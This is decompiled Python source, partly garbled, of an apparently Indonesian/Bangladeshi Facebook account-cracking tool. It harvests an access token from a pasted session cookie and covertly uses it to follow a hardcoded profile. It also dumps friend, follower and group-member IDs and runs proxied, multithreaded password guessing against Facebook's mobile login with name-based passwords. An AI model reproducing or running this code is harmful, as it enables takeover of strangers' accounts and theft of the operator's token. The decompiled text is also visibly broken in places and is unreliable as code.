# Source Generated with Decompyle++
# File: dec.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz

try:
    import rich
finally:
    pass
if ImportError:
    cetak(nel('\t• Sedang Menginstall Modul Rich •'))
    os.system('pip install rich')



try:
    import stdiomask
finally:
    pass
if ImportError:
    cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
    os.system('pip install stdiomask')



try:
    import requests
finally:
    pass
if ImportError:
    cetak(nel('\t• Sedang Menginstall Modul Requests •'))
    os.system('pip install requests && pip install mechanize ')


pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
finally:
    pass
if Exception:
    e = None
    
    try:
        print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
    finally:
        e = None
        del e
    e = None
    del e
    prox = open('.prox.txt', 'r').read().splitlines()
    for xd in range(10000):
        a = 'Mozilla/5.0 (Symbian/3; Series60/'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Nokia'
        e = random.randrange(100, 99999)
        f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k = 'Mobile Safari/535.1'
        uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
        ugen2.append(uaku)
    for d in range(10000):
        aa = 'Mozilla/5.0 (Linux; Android'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = 'SAMSUNG SM-'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(678, 99999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0  Chrome/'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;com.facebook.orca;com.facebook.lite;com.facebook.katana FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
        uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen.append(uaku2)
    for x in range(10000):
        a = 'BlackBerry'
        b = random.randrange(4000, 99999)
        c = random.randrange(1, 6)
        d = random.choice([
            '0',
            '1',
            '2',
            '3',
            '4',
            '5',
            '6'])
        e = '0'
        f = random.randrange(100, 999)
        g = 'Profile/MIDP-'
        h = '2'
        i = random.choice([
            '0',
            '1'])
        j = 'Configuration/CLDC-1.1'
        k = 'VendorID/'
        l = random.randrange(100, 999)
        uaku = f'''{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}'''
    
    def uaku():
        
        try:
            ua = open('bbnew.txt', 'r').read().splitlines()
            for ub in ua:
                ugen.append(ub)
        finally:
            return None
            a = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
            ua = open('.bbnew.txt', 'w')
            aa = re.findall('line">(.*?)<', str(a))
            for un in aa:
                ua.write(un + '\n')
            ua = open('.bbnew.txt', 'r').read().splitlines()
            return None


    (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
    cokbrut = []
    pwpluss = []
    pwnya = []
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m'
    O = '\x1b[1;96m'
    N = '\x1b[0m'
    Z = '\x1b[1;30m'
    sir = '\x1b[41m\x1b[1;97m'
    x = '\x1b[m'
    m = '\x1b[1;91m'
    k = '\x1b[93m'
    h = '\x1b[1;92m'
    hh = '\x1b[32m'
    u = '\x1b[95m'
    kk = '\x1b[33m'
    b = '\x1b[1;96m'
    p = '\x1b[0;34m'
    asu = random.choice([
        m,
        k,
        h,
        u,
        b])
    dic = {
        '1': 'January',
        '2': 'February',
        '3': 'March',
        '4': 'April',
        '5': 'May',
        '6': 'June',
        '7': 'July',
        '8': 'August',
        '9': 'September',
        '10': 'October',
        '11': 'November',
        '12': 'December' }
    dic2 = {
        '01': 'January',
        '02': 'February',
        '03': 'March',
        '04': 'April',
        '05': 'May',
        '06': 'June',
        '07': 'July',
        '08': 'August',
        '09': 'September',
        '10': 'October',
        '11': 'November',
        '12': 'Devember' }
    tgl = datetime.datetime.now().day
    bln = dic[str(datetime.datetime.now().month)]
    thn = datetime.datetime.now().year
    okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    
    def alvino_xy(u):
        for e in u + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.05)

    
    def clear():
        os.system('clear')

    
    def back():
        login()

    
    def banner():
        print(f'''\t{asu} \n\x1b[1;33m██████   ██ ██   ██  ██████  ███    ██ \n\x1b[1;35m██   ██ ███ ██   ██ ██  ████ ████   ██ \n\x1b[1;32m██████   ██ ███████ ██ ██ ██ ██ ██  ██ \n\x1b[1;95m██   ██  ██      ██ ████  ██ ██  ██ ██ \n\x1b[1;33m██   ██  ██      ██  ██████  ██   ████ \n               \n               \n\x1b[1;35m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇\n       \x1b[1;32mFACEBOOK \x1b[1;34mMD NANU MIAH \n       \x1b[1;33mAUTHOR \x1b[1;32mMOHAMMAD RIPON HASAN\n       \x1b[1;34mGITHUB \x1b[1;35mR140N \n       \x1b[1;36mWHATSAPP \x1b[1;33m+8801822695844\n\x1b[1;32m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇\n\n''')

    
    def login():
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
            tokenku.append(token)
            
            try:
                sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                    'cookie': cok }, **('cookies',))
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                menu(sy2, sy3)
            finally:
                return None
                if KeyError:
                    login_lagi334()
                return None
                if :
                    li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                    lo = mark(li, 'red', **('style',))
                    sol().print(lo, 'cyan', **('style',))
                    exit()
                return None
                if IOError:
                    login_lagi334()
                    return None



    
    def login_lagi334():
        
        try:
            os.system('clear')
            banner()
            cetak(nel('\x1b[1;33mMOHAMMAD RIPON HASAN =======♥======= NICKNAME R140N'))
            asu = random.choice([
                m,
                k,
                h,
                b,
                u])
            cookie = input(f'''  [{h}•{x}] Cookies :{asu} ''')
            data = requests.get('https://business.facebook.com/business_locations', {
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                'referer': 'https://www.facebook.com/',
                'host': 'business.facebook.com',
                'origin': 'https://business.facebook.com',
                'upgrade-insecure-requests': '1',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
                'content-type': 'text/html; charset=utf-8' }, {
                'cookie': cookie }, **('headers', 'cookies'))
            find_token = re.search('(EAAG\\w+)', data.text)
            ken = open('.token.txt', 'w').write(find_token.group(1))
            bot()
            cok = open('.cok.txt', 'w').write(cookie)
            print(f'''  {x}[{h}•{x}]{h} LOGIN BERHASIL.........!!!!{x} ''')
            time.sleep(1)
            exit()
        finally:
            return None
            if Exception:
                e = None
                
                try:
                    os.system('rm -f .token.txt')
                    os.system('rm -f .cok.txt')
                    print('  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s' % (x, k, x, m, x))
                    exit()
                finally:
                    e = None
                    del e
                    return None
                    e = None
                    del e



    
    def bot():
        
        try:
            requests.post('https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s' % tokenku)
        finally:
            return None
            return None


    
    def menu(my_name, my_id):
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        finally:
            pass
        if IOError:
            print('[×] Cookies Kadaluarsa ')
            time.sleep(5)
            login_lagi334()
        

        os.system('clear')
        banner()
        ip = requests.get('https://api.ipify.org').text
        gh = 'github.com/R140N'
        cetak(nel('\t Mr R140N TERMUX COMMAND  [yellow]%s[white] == Mr.R140N' % my_name))
        print('R140N=> Your Idz : ' + str(my_id))
        print(f'''R140N=> Your Ip  : {ip}''')
        print(f'''R140N=> Github   : {gh}''')
        print('')
        print('R140N=> 1. Crack Publik ')
        print('R140N=> 0. Exit       ')
        _____alvino__adijaya_____ = input('\nR140N=> Choice : ')
        if _____alvino__adijaya_____ in ('1',):
            dump_massal()
            return None
        if None in ('0',):
            os.system('rm -rf .token.txt')
            os.system('rm -rf .cookie.txt')
            print('R140N=> Successful Logout ')
            exit()
            return None
        None('R140N=> Choice Yang Bener Asu ')
        back()

    
    def error():
        print(f'''{k}R140N=> Maaf Fitur Ini Masih Di Perbaiki {x}''')
        time.sleep(4)
        back()

    
    def result():
        print(f'''R140N=> 1. R140N {h}OK{x} Anda ''')
        print(f'''R140N=> 2. R140N {k}CP{x} Anda ''')
        print('R140N=> 3. Kembali\t')
        kz = input('\nR140N=> Choice : ')
        if kz in ('2',):
            
            try:
                vin = os.listdir('CP')
            finally:
                pass
            if FileNotFoundError:
                print('R140N=> File Tidak Di Temukan ')
                time.sleep(3)
                back()
            

            if len(vin) == 0:
                print('R140N=> Anda Tidak Memiliki R140N CP ')
                time.sleep(2)
                back()
                return None
            cih = None
            lol = { }
            for isi in vin:
                
                try:
                    hem = open('CP/' + isi, 'r').readlines()
                finally:
                    pass
                continue
                cih += 1
                if cih < 10:
                    nom = '' + str(cih)
                    lol.update({
                        str(cih): str(isi) })
                    lol.update({
                        nom: str(isi) })
                    print(f'''R140N=> %s. %s ({k} %s {x}Idz )''' % (nom, isi, len(hem)))
                    continue

                lol.update({
                    str(cih): str(isi) })
                print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
            geeh = input('\nR140N=> Choice : ')
            
            try:
                geh = lol[geeh]
            finally:
                pass
            if KeyError:
                print('R140N=> Choice Yang Bener Kontol ')
                back()
            

            
            try:
                lin = open('CP/' + geh, 'r').read().splitlines()
            finally:
                pass
            print('R140N=> File Tidak Di Temukan ')
            time.sleep(2)
            back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f'''{x}R140N=> {k}{cpkuni[0]}|{cpkuni[1]}''')
                nocp += 1
            print('')
            input(f'''{x}[{m} Klik Enter{x} ]''')
            back()
            return None
            if kz in ('1',):
                
                try:
                    vin = os.listdir('OK')
                finally:
                    pass
                if FileNotFoundError:
                    print('R140N=> File Tidak Di Temukan ')
                    time.sleep(2)
                    back()
                

                if len(vin) == 0:
                    print('R140N=> Anda Tidak Mempunyai File OK ')
                    time.sleep(2)
                    back()
                    return None
                cih = None
                lol = { }
                for isi in vin:
                    
                    try:
                        hem = open('OK/' + isi, 'r').readlines()
                    finally:
                        pass
                    continue
                    cih += 1
                    if cih < 10:
                        nom = '0' + str(cih)
                        lol.update({
                            str(cih): str(isi) })
                        lol.update({
                            nom: str(isi) })
                        print(f'''R140N=> %s. %s ( {h}%s{x} Idz )''' % (nom, isi, len(hem)))
                        continue

                    lol.update({
                        str(cih): str(isi) })
                    print(f'''R140N=> %s. %s ({h} %s {x}Idz )''' % (cih, isi, len(hem)))
                geeh = input('\nChoice : ')
                
                try:
                    geh = lol[geeh]
                finally:
                    pass
                if KeyError:
                    print('R140N=> Choice Yang Bener Kontol ')
                    back()
                

                
                try:
                    lin = open('OK/' + geh, 'r').read().splitlines()
                finally:
                    pass
                print('R140N=> File Tidak Di Temukan ')
                time.sleep(2)
                back()
                nocp = 0
                for cpku in range(len(lin)):
                    cpkuni = lin[nocp].split('|')
                    print('')
                    print(f'''{x}R140N=> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}''')
                    nocp += 1
                print('')
                input(f'''{x}[{m} Klik Enter{x} ]''')
                back()
                return None
                if kz in ('3',):
                    back()
                    return None
                None('R140N=> Choice Yang Bener Kontol ')
                back()
                return None



    
    def dump_massal():
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        finally:
            pass
        if IOError:
            exit()
        

        
        try:
            jum = int(input('R140N=> Total (Max 5 ) : '))
        finally:
            pass
        if ValueError:
            print('R140N=> Masukkan Angka Anjing, Malah Huruff ')
            exit()
        

        if jum < 1 or jum > 1000:
            print('R140N=> Gagal Dump Idz ')
            exit()
        ses = requests.Session()
        yz = 0
        for met in range(jum):
            yz += 1
            kl = input('R140N=> Public UID ' + str(yz) + ' : ')
            uid.append(kl)
        for userr in uid:
            
            try:
                col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                    'cookies': cok }, **('cookies',)).json()
                for mi in col['friends']['data']:
                    
                    try:
                        iso = mi['id'] + '|' + mi['name']
                        if iso in id:
                            pass
                        else:
                            id.append(iso)
                    finally:
                        continue
                        continue
                        continue
                        if (KeyError, IOError):
                            continue
                        if requests.exceptions.ConnectionError:
                            print('R140N=> Sinyal Loh Kek Kontoll ')
                            exit()
                            continue
                        
                        try:
                            print('')
                            print(f'''R140N=> Total Idz {h}''' + str(len(id)))
                            setting()
                        finally:
                            return None
                            if requests.exceptions.ConnectionError:
                                print(f'''{x}''')
                                print('R140N=> Sinyal Lo kek Kontol ')
                                back()
                                return None
                            if (KeyError, IOError):
                                print(f'''R140N=>{k} Pertemanan Tidak Public {x}''')
                                time.sleep(3)
                                back()
                                return None




    
    def dump_pengikut():
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        finally:
            pass
        if IOError:
            exit()
        

        print('R140N=> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
        pil = input('R140N=> Masukkan Idz Target : ')
        
        try:
            koh2 = requests.get('https://graph.facebook.com/' + pil + '?fields=subscribers.limit(99999)&access_token=' + tokenku[0], {
                'cookie': cok }, **('cookies',)).json()
            for pi in koh2['subscribers']['data']:
                
                try:
                    id.append(pi['id'] + '|' + pi['name'])
                finally:
                    continue
                    continue
                    print(f'''R140N=> Total Idz :{h} ''' + str(len(id)))
                    setting()
                    return None
                    if requests.exceptions.ConnectionError:
                        print('R140N=> Koneksi Internet Bermasalah ')
                        exit()
                        return None
                    if (KeyError, IOError):
                        print('R140N=> Gagal Mengambil Target ')
                        exit()
                        return None



    balmond = b + '[' + h + '✓' + b + ']'
    
    def lah():
        print(f'''\n{x}R140N=> Total Idz Yang Terkumpul :{h} %s ''' % len(id))
        input(f'''{x}R140N=> [ {m}Klik Enter {x}] ''')
        print('')
        setting()

    
    def grup():
        print('')
        id = input(f'''{x}R140N=> Masukkan Username Atau Idz Grup : ''')
        ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
        miskinlu = {
            'user-agent': ua }
        url = 'https://mbasic.facebook.com/groups/' + id
        ses = requests.Session()
        
        try:
            gn = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
        finally:
            pass
        if requests.exceptions.ConnectionError:
            print('R140N=> Sinyal Loo Kek Kontol ')
            time.sleep(0.5)
            exit()
        

        berr = gn.find('title')
        berr2 = berr.text.replace(' | Facebook', '').replace(' Grup Publik', '')
        if berr2 == 'Masuk Facebook':
            print(' Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..')
            time.sleep(0.5)
            grup()
        elif berr2 == 'Kesalahan':
            alvino_xy('R140N=> Grup Tidak Di Temukan ')
            time.sleep(0.5)
            grup()
        
        print(f'''{x}R140N=> Nama Grup : {b}%s''' % berr2)
        ggs = gn.find_all('table')
        ang = []
        for ff in ggs:
            anggo = ff.text
            bro = anggo.replace('Anggota', '')
            
            try:
                mex = int(bro)
                jumlah = ang.append(mex)
            finally:
                continue
                continue
                if len(ang) == 0:
                    print(' Anggota : -')
                else:
                    print(f'''{x}R140N=> Anggota : {h}%s''' % ang[0])
                grup1(url)
                return None


    
    def grup1(urls):
        use = []
        ses = requests.Session()
        print(f'''{x}R140N=> Sedang Mengumpulkan Idz ''')
        print(f'''R140N=> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!''')
        
        try:
            ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
            miskinlu = {
                'user-agent': ua }
            
            try:
                url = use[0]
            finally:
                pass
            url = urls
            set = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
            bf2 = set.find_all('a')
            for g in bf2:
                css = str(g).split('>')
                if 'Lihat Postingan Lainnya</span' in css:
                    bcj = str(g).replace('<a href="', '').replace('amp;', '')
                    bcj2 = bcj.split(' ')[0].replace('"><img', '')
            tes = set.find_all('table')
            for cari in tes:
                liatnih = cari.text
                spl = liatnih.split(' ')
                if 'mengajukan' in spl:
                    idsiapa = re.findall('content_owner_id_new.\\w+', str(cari))
                    idyou = idsiapa[0].replace('content_owner_id_new.', '')
                    namayou = liatnih.replace(' mengajukan pertanyaan .', '')
                    idku = idyou + '|' + namayou
                    if idku in id:
                        continue
                    id.append(idku)
                    print('\r' + balmond + h + ' { ' + k + 'Proses Mengambil ID ' + str(len(id)) + h + ' }', '', **('end',))
                    sys.stdout.flush()
                    continue
                if '>' in spl:
                    idsiapa = re.findall('content_owner_id_new.\\w+', str(cari))
                    idyou = idsiapa[0].replace('content_owner_id_new.', '')
                    namayou = liatnih.split(' > ')[0]
                    idku = idyou + '|' + namayou
                    if idku in id:
                        continue
                    id.append(idku)
                    xy = random.choice([
                        m,
                        k,
                        h,
                        u,
                        b,
                        x])
                    print(f'''\r\t———R140N=> {x}({xy} %s {x}) <<———''' % len(id), '', **('end',))
                    sys.stdout.flush()
                    continue
            
            try:
                link_ = bcj2
                use.insert(0, 'https://mbasic.facebook.com' + link_)
            finally:
                pass
            girang = set.find('title')
            girang2 = girang.text.replace(' | Facebook', '').replace(' Grup Publik', '')
            if girang2 == 'Masuk Facebook':
                pass
            else:
                lah()


        finally:
            pass
        if requests.exceptions.ConnectionError:
            
            try:
                time.sleep(31)
            finally:
                pass
            if KeyboardInterrupt:
                lah()
            

        elif KeyboardInterrupt:
            lah()
        

        continue

    
    def crack_file():
        
        try:
            vin = os.listdir('ALVINO-DUMP')
        finally:
            pass
        if FileNotFoundError:
            print('R140N=> File Tidak Ditemukan ')
            time.sleep(2)
            back()
        

        if len(vin) == 0:
            print('')
            cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Choice Fitur Nomor[yellow] 4 [white]ini '))
            kontol = input('\nR140N=> Apakah Anda Faham ( Y/t ) ')
            if kontol in ('',):
                print('R140N=> Choice Yang Bener Asuhh ')
            elif kontol in ('y', 'Y'):
                print(f'''\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ''')
                time.sleep(3)
                back()
            elif kontol in ('t', 'T'):
                print(f'''\n[{k}x{x}] Anda Sungguh Tolol ''')
                time.sleep(3)
                exit()
            print('R140N=> Anda Tidak Memiliki File Dump ')
            time.sleep(2)
            back()
            return None
        cih = None
        lol = { }
        for isi in vin:
            
            try:
                hem = open('ALVINO-DUMP/' + isi, 'r').readlines()
            finally:
                pass
            continue
            cih += 1
            if cih < 100:
                nom = '' + str(cih)
                lol.update({
                    str(cih): str(isi) })
                lol.update({
                    nom: str(isi) })
                print(f'''R140N=> %s. %s ({h} %s{x} idz )''' % (nom, isi, len(hem)))
                continue

            lol.update({
                str(cih): str(isi) })
            print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
            print('R140N=> %s. %s ({h} %s {x}idz) ' % (cih, isi, len(hem)))
        geeh = input('\nR140N=> Choice : ')
        
        try:
            geh = lol[geeh]
        finally:
            pass
        if KeyError:
            print(f'''{k}R140N=> Choice Yang Bener Kontol {x}''')
            time.sleep(3)
            back()
        

        
        try:
            lin = open('ALVINO-DUMP/' + geh, 'r').read().splitlines()
        finally:
            pass
        print('R140N=> File Tidak Ditemukan, Coba Lagi Nanti ')
        time.sleep(2)
        back()
        for xid in lin:
            id.append(xid)
        setting()
        return None


    
    def setting():
        print(f'''{x}R140N=> 1. Crack Old ''')
        print('R140N=> 2. Crack New ')
        print('R140N=> 3. Crack random ')
        hu = input('R140N=> Choice : ')
        if hu in ('1', '01'):
            for tua in sorted(id):
                id2.append(tua)
        elif hu in ('2', '02'):
            muda = []
            for bacot in sorted(id):
                muda.append(bacot)
            bcm = len(muda)
            bcmi = bcm - 1
            for xmud in range(bcm):
                id2.append(muda[bcmi])
                bcmi -= 1
        elif hu in ('3', '03'):
            for bacot in id:
                xx = random.randint(0, len(id2))
                id2.insert(xx, bacot)
        else:
            print('R140N=> Choice Yang Bener Kontooll ')
            exit()
        print('R140N=> 1. Mobile ')
        print('R140N=> 2. Mbasic ')
        print('R140N=> 3. Touch  ')
        print('R140N=> 4. Mtouch ')
        print('')
        hc = input('R140N=> Choice : ')
        if hc in ('1', '01'):
            method.append('mobile')
        elif hc in ('',):
            print('R140N=> Choice Yang Bener Kontol ')
            setting()
        elif hc in ('2', '02'):
            method.append('free')
        elif hc in ('3', '03'):
            method.append('touch')
        elif hc in ('4', '04'):
            method.append('mbasic')
        else:
            method.append('mobile')
        print('')
        _jembot_ = input('R140N=> apps add show ( Y/t ) ')
        if _jembot_ in ('',):
            print('R140N=> Choice Yang Bener Kontol ')
            back()
        elif _jembot_ in ('y', 'Y'):
            taplikasi.append('ya')
        else:
            taplikasi.append('no')
        pwplus = input('R140N=>  Password Manual ( Y/t ) ')
        if pwplus in ('y', 'Y'):
            pwpluss.append('ya')
            cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
            pwku = input('R140N=>  Password (Example)  (123456) : ')
            pwkuh = pwku.split(',')
            for xpw in pwkuh:
                pwnya.append(xpw)
        else:
            pwpluss.append('no')
        passwrd()

    
    def passwrd():
        print(f'''R140N=>R140N=>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ''')
        print('')
        print(f'''R140N=> R140N {h}OK{x} : {h}OK/%s {x}''' % okc)
        print(f'''R140N=> R140N {k}CP{x}  : {k}CP/%s {x}''' % cpc)
        print(f'''R140N=>  Mode START {m}1k{x} Idz\n''')
        with tred(30, **('max_workers',)) as pool:
            for yuzong in id2:
                idf = yuzong.split('|')[0]
                nmf = yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = []
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(frs + '123')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                elif len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                
                if 'mobile' in method:
                    pool.submit(crack, idf, pwv)
                    continue
                if 'free' in method:
                    pool.submit(crackfree, idf, pwv)
                    continue
                if 'touch' in method:
                    pool.submit(cracktouch, idf, pwv)
                    continue
                if 'mbasic' in method:
                    pool.submit(crackmbasic, idf, pwv)
                    continue
                pool.submit(crackmbasic, idf, pwv)
            None(None, None, None)
        if not None:
            pass
        print('')
        cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
        print(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
        print(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
        print('')
        print('R140N=> Lanjut Crack Kembali ( Y/t ) ? ')
        woi = input('R140N=> Choice : ')
        if woi in ('y', 'Y'):
            back()
            return None
        None(f'''\t{x}R140N=>{k} Good Bye Dadaahh{x} << ''')
        time.sleep(2)
        exit()

    
    def crack(idf, pwv):
        bo = random.choice([
            m,
            k,
            h,
            b,
            u,
            x])
        (sys.stdout.write(f'''\r🔥 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
    # WARNING: Decompyle incomplete

    
    def crackfree(idf, pwv):
        global cp, ok, loop
        bi = random.choice([
            u,
            k,
            kk,
            b,
            h,
            hh])
        pers = loop * 100 / len(id2)
        fff = '%'
        nip = random.choice(prox)
        proxs = {
            'http': 'socks4://' + nip }
        print('\r [%s●\x1b[m] %s/%s 💀 \x1b[1;92mOK:[%s] 💀 \x1b[1;93mCP:[%s] %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
            
            try:
                tix = time.time()
                ses.headers.update({
                    'Host': 'm.facebook.com',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua2,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://m.facebook.com/',
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
                dataa = {
                    'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                    'uid': idf,
                    'flow': 'login_no_pin',
                    'pass': pw,
                    'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
                ses.headers.update({
                    'Host': 'm.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://m.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', dataa, False, proxs, **('data', 'allow_redirects', 'proxies'))
